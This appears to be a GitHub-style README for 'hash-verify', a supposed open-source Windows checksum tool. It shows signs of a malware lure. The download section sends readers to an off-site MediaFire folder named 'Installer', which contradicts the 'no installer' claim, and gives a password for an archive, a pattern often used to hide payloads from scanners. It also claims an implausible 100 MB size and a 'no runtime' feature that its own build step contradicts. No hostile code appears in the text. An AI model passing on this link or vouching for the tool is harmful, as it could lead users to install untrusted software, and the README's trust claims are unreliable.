# hash-verify

🔢 Free, open-source file hash checker for Windows — drag, drop, compare MD5/SHA-256 and verify downloads offline. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Drag-and-drop hashing** — drop one file or a folder, get MD5, SHA-1, SHA-256 and SHA-512 computed in one pass
- ✅ **Compare against published checksum** — paste the vendor hash and get MATCH or MISMATCH in green or red, with case tolerance
- ✅ **Two-file compare** — point at a downloaded file and a reference copy to prove they are byte-identical
- ✅ **Batch manifest mode** — hash hundreds of files into a checksum list and re-verify the list later
- ✅ **Copy-friendly output** — one click copies Name, Size, SHA-256 as tab-separated text for tickets and logs
- ✅ **No uploads, no shell lock-in** — hashing runs locally; optional context menu entry is off by default
- ✅ **100 MB self-contained exe** — runtime bundled, portable and offline, MIT with SHA-256 releases

## Why hash-verify

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **hash-verify** | QuickHash | HashTab | Get-FileHash |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Built-in |
| Open source | **Yes** | Yes | No | No |
| Paste-and-compare verdict | **Yes** | Yes | Yes | No |
| Folder batch manifests | **Yes** | Yes | No | Scripted only |
| Native GUI, no runtime | **Yes** | Yes | Explorer only | CLI only |
| Portable, no install | **Yes, 100 MB** | Zip | Installer | With OS |

## FAQ

**how to verify a downloaded file checksum on Windows?**

The built-in answer is a PowerShell command most people never learn, and online checksum sites make you upload the exact file you do not trust yet. hash-verify computes locally: drop the file, paste the publisher hash, read MATCH or MISMATCH with no network involved. It is a 100 MB portable exe under MIT with no telemetry and CI-verified releases.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark window (#121418, blue #60A5FA): drop zone top, file card with size and modified date, four hash rows with copy icons.
2. Compare panel: pasted vendor checksum field, large green MATCH banner after verification, algorithm dropdown set to SHA-256.
3. Batch manifest view: folder tree of 214 files hashing in parallel, progress bar at 71%, export-to-CSV button bottom right.

## Download

| Source | Link |
|---|---|
| 💾 **Installer hash-verify** | [Installer hash-verify](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).